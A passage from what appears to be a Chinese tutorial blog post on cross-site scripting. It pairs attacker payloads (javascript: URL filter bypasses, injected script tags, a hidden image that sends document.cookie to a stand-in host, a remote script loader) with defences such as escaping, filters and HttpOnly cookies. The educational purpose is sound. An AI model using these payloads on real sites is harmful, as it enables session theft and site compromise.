operator">?</span>' <span class="token operator">+</span> <span class="token comment">//ftp的user@</span>
    '<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>|' <span class="token operator">+</span> <span class="token comment">// IP形式的URL- 199.194.52.184</span>
    '<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z_<span class="token operator">!</span>~<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token operator">*</span>' <span class="token operator">+</span> <span class="token comment">// 域名- www.</span>
    '<span class="token punctuation">[</span>a<span class="token operator">-</span>z<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">)</span>' <span class="token operator">+</span> <span class="token comment">//域名的扩展名</span>
    '<span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">?</span>' <span class="token operator">+</span> <span class="token comment">// 端口- :80</span>
    '<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">?</span><span class="token punctuation">)</span>|<span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span>9a<span class="token operator">-</span>z_<span class="token operator">!</span>~<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token operator">?:</span>@&amp;<span class="token operator">=</span><span class="token operator">+</span>$<span class="token punctuation">,</span><span class="token operator">%</span>#<span class="token operator">-</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">/</span><span class="token operator">?</span><span class="token punctuation">)</span>$'<span class="token punctuation">;</span>
  <span class="token keyword">var</span> objExp <span class="token operator">=</span> new <span class="token function">RegExp</span><span class="token punctuation">(</span>Expression<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>objExp<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> <span class="token keyword">val</span> <span class="token operator">=</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span>'redirect_to'<span class="token punctuation">)</span><span class="token punctuation">;</span>
$output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token keyword">val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">testUrl</span><span class="token punctuation">(</span><span class="token keyword">val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $jump<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span>'href'<span class="token punctuation">,</span> <span class="token keyword">val</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=XG9ZRtG8WVR1AAsTugI%2BMg%3D%3D.jJuFJ1RYX5hcvELG8WL0FshynDkHfxkgMbRrSi7YU84%2FxeqIdUhWT7OBeTEU41oF">demo4</a><br>
因为富文本有问题,只能截图.</p>
<p>但是不是每个<code>a</code>标签都是用于跳转页面的,例如通过Scheme协议打开APP界面</p>
<pre class="line-numbers language-routeros" data-language="routeros"><code class="language-routeros">&lt;a href="Scheme协议"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样子你就把其他非属性跳转的用法都干掉了,所以B想了想不妥,还是换一种方式禁止,直接判断执行前缀</p>
<pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">var</span> <span class="token keyword">val</span> <span class="token operator">=</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span>'redirect_to'<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token operator">/</span>javascript<span class="token operator">:</span><span class="token operator">/</span>gi<span class="token punctuation">;</span>
$output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token keyword">val</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">!</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $jump<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span>'href'<span class="token punctuation">,</span> <span class="token keyword">val</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=GKh%2Bza854rEwRA1V4aHVFw%3D%3D.IAKeiENsJj5PkeI0wWJ6i5cBmzfsu0hp8fYODACE%2B43AikV4MPPB52U3QdRf8QkC">demo5</a><br>
因为浏览器不区分大小写,所以需要注意一下.更新版本之后B以为已经堵死这条路了,殊不知A换个方式改成编码或者回车空格等</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">?</span>redirect_to<span class="token operator">=</span>jav ascript<span class="token symbol">:alert</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'XSS'</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token symbol">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">?</span>redirect_to<span class="token operator">=</span>javascrip<span class="token operator">?</span><span class="token number">74</span><span class="token symbol">:alert</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'XSS'</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这就尴尬了,虽然浏览器并不会执行,但是这些也能完全避开B的拦截规则,也可能会引起其他隐患</p>
<h3 id="还有种内联数据用法-将序列化的数据通过URL传递给其他页面使用">还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
            output:
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>out<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://libs.baidu.com/jquery/2.0.0/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">var</span> $output <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#out'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token keyword">function</span> <span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'(^|&amp;)'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'=([^&amp;]*)(&amp;|$)'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">var</span> val <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">getQueryString</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                $output<span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=lw1mgiqi%2BgpjsN7XtxGtgQ%3D%3D.kSUSKSu1hIaylfuR9LAXYDYeyafnFTEOJghTWig0wbJBV0b3YrMUzIFvVR4G74cI">demo6</a><br>
A可以直接修改URL参数注入代码</p>
<pre class="line-numbers language-awk" data-language="awk"><code class="language-awk">https<span class="token operator">:</span><span class="token regex">//</span>www.test.com<span class="token operator">/</span><span class="token operator">?</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"data"</span><span class="token operator">:</span><span class="token string">"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSt-1670834128685-7.png" alt="图片描述"></p>
<h3 id="A通过恶意脚本在页面插入图片自动发起恶意请求">A通过恶意脚本在页面插入图片自动发起恶意请求</h3>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>src <span class="token operator">=</span>
  <span class="token string">'http://www.test.com/cheat.html?url='</span> <span class="token operator">+</span>
  <span class="token function">escape</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span> <span class="token operator">+</span>
  <span class="token string">'&amp;content='</span> <span class="token operator">+</span>
  <span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string">'display:none'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=HyNsNtiso%2FP4qBVkuB3HBg%3D%3D.K5rc87juwtWRDIwIUga7MX1WYXIAHW0fkwI8NBV9olOSDk4sZUlLGfAoOHsEbh8f">demo7</a><br>
B让服务端采用了比较简单的办法使用<code>httponly</code>禁止JS脚本访问cookies信息让A无法拿到</p>
<h3 id="A通过事件注入恶意脚本">A通过事件注入恶意脚本</h3>
<pre class="line-numbers language-dart" data-language="dart"><code class="language-dart"><span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'img'</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'#'</span></span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>onerror <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'script'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span>
  <span class="token string-literal"><span class="token string">'http://www.test.com/cheat.js'</span></span><span class="token punctuation">;</span>
img<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token string-literal"><span class="token string">'display:none'</span></span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整源码可以查看<a href="https://link.segmentfault.com/?enc=0E77Ps%2B91Qg%2FBv1D3QCfeA%3D%3D.nfOm9N11kbP9QyK63oB%2Fg0psy1yz3KmkDcTxo8dGIXTtfgSc29jKHGuJTX1Q6XHX">demo8</a><br>
当浏览器向web服务器发送请求的时候，一般会带上<code>Referer</code>，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。可以让服务端限制必须是白名单才能通过请求达到防盗链功能,但是丢失<code>Refere</code>情况比较多,而且容易被恶意修改,所以大多只适用于资源被恶意引用的情况</p>
<h3 id="A利用浏览器的解码顺序进行混合编码组装">A利用浏览器的解码顺序进行混合编码组装</h3>
<p>当浏览器进行绘制时，解码顺序分别为 HTML &gt; URL &gt; JS,所以A构造了这么一段代码</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript&amp;#58;alert('\&lt;%E6%B5%8B%E8%AF%95\&gt;')"</span><span class="token operator">&gt;</span>jump<span class="token filehandle symbol">&lt;/a&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>首先是 HTML 解码，结果为</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert('\&lt;%E6%B5%8B%E8%AF%95\&gt;')"</span><span class="token operator">&gt;</span>jump<span class="token filehandle symbol">&lt;/a&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后是 URL 解码，结果为</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert('\&lt;测试\&gt;')<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>jump<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>最后是 JS 解码，结果为</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert('&lt;测试&gt;')<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>jump<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以可以攻击的方式很多种,相比于针对处理我们应该先了解相关的攻击方式</p>
<h2 id="XSS攻击方式">XSS攻击方式</h2>
<ul>
<li>
<p>所有用户输入内容都有潜在的风险</p>
</li>
<li>
<p>利用<code>script</code>标签注入<code>HTML/Javascript</code>代码</p>
</li>
<li>
<p>利用拥有<code>href</code>和<code>src</code>等属性的标签</p>
</li>
<li>
<p>利用空格、回车和Tab等拼接方式绕开拦截</p>
</li>
<li>
<p>利用字符编码绕开拦截（JS支持unicode、eacapes、十六进制、十进制等编码形式）</p>
</li>
<li>
<p>利用<code>onload</code>,<code>onscroll</code>等事件执行恶意代码</p>
</li>
<li>
<p>利用样式属性<code>backgrund-image</code>等执行(听说主流浏览器已处理)</p>
</li>
<li>
<p>URL参数</p>
</li>
<li>
<p>Cookies</p>
</li>
<li>
<p>请求<code>header</code>的<code>referer</code></p>
</li>
<li>
<p>恶意代码拆分组装</p>
</li>
<li>
<p>各种API</p>
<pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus"><span class="token comment">// URL相关</span>
document<span class="token punctuation">.</span>location
document<span class="token punctuation">.</span>URL
document<span class="token punctuation">.</span>URLUnencoded
document<span class="token punctuation">.</span>referrer
window<span class="token punctuation">.</span>location
<span class="token comment">// 操作dom</span>
document<span class="token punctuation">.</span><span class="token func"><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
document<span class="token punctuation">.</span><span class="token func"><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
document<span class="token punctuation">.</span>boby<span class="token punctuation">.</span>innerHtml
<span class="token comment">// 特殊函数</span>
<span class="token func"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
window<span class="token punctuation">.</span><span class="token func"><span class="token function">execScript</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
window<span class="token punctuation">.</span><span class="token func"><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
window<span class="token punctuation">.</span><span class="token func"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="token comment">// 重定向</span>
document<span class="token punctuation">.</span>location
document<span class="token punctuation">.</span>URL
document<span class="token punctuation">.</span><span class="token func"><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href
window<span class="token punctuation">.</span><span class="token func"><span class="token function">navigate</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
window<span class="token punctuation">.</span>open<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<p>总的来说分两种类型:</p>
<ol>
<li>攻击者手动提交恶意代码</li>
<li>浏览器自动执行恶意代码</li>
</ol>
<h2 id="防御">防御</h2>
<ul>
<li>
<p>针对上面的案例如果B选择前端进行内容转义,会引起什么问题呢?</p>
<p>如果攻击者不直接经过前端界面,而是直接自己构造请求就可以破解了</p>
</li>
<li>
<p>但是B是在发送请求之前转义又会有什么问题?</p>
<p>如果是需要用于界面展示的话,引用到字段的地方都需要处理,大部分模板都会自动转义处理,但是如果用在JS不能直接使用或者计算,例如长度判断等</p>
<p>需要根据上下文采用不同的转义规则增大处理难度,如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等,所以这更适用于固定类型的内容,例如URL,号码等</p>
</li>
</ul>
<h3 id="XSS-Filter">XSS Filter</h3>
<ul>
<li>用户提交数据进行验证,只接受限定长度/内容</li>
<li>表单数据指定具体类型</li>
<li>过滤移除特殊的html标签,<code>script</code>和<code>iframe</code>等</li>
<li>过滤移除特殊的Javascript代码,<code>javascript:</code>和事件等</li>
</ul>
<h3 id="HTML-Entity-举例部分">HTML Entity(举例部分)</h3>
<table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">实体编号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">&lt;</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">&gt;</td>
</tr>
<tr>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">&amp;</td>
</tr>
<tr>
<td style="text-align:center">"</td>
<td style="text-align:center">"</td>
</tr>
<tr>
<td style="text-align:center">’</td>
<td style="text-align:center">'</td>
</tr>
<tr>
<td style="text-align:center">空格</td>
<td style="text-align:center">&nbsp;</td>
</tr>
</tbody>
</table>
<h3 id="请求限制">请求限制</h3>
<ul>
<li>将重要的Cookie标记为HTTP Only,不能通过客户端脚本读取和修改</li>
<li>设置<code>referer</code>防止恶意请求</li>
<li>实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行</li>
</ul>
<h3 id="防御实现代码举例">防御实现代码举例</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 非法参数过滤器 --&gt;</span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>IllegalCharacterFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">&gt;</span></span>com.hots.ssp.common.safety.IllegalCharacterFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>
			<span class="token comment">&lt;!-- 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀 及全路径，多个配置用逗号分隔 --&gt;</span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>excludedPaths<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>
			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/images/*,*.jsp, *.css, *.ico<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">&gt;</span></span>IllegalCharacterFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>dayainfo<span class="token punctuation">.</span>ssp<span class="token punctuation">.</span>common<span class="token punctuation">.</span>safety</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicBoolean</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IllegalCharacterFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>
    <span class="token comment">/**
     * 不需要被过滤器拦截的页面 ，主要用于静态资源的放行
     * 在web.xml中配置filter的init-param
     */</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> excludedPaths<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> excludedPathArray<span class="token punctuation">;</span>

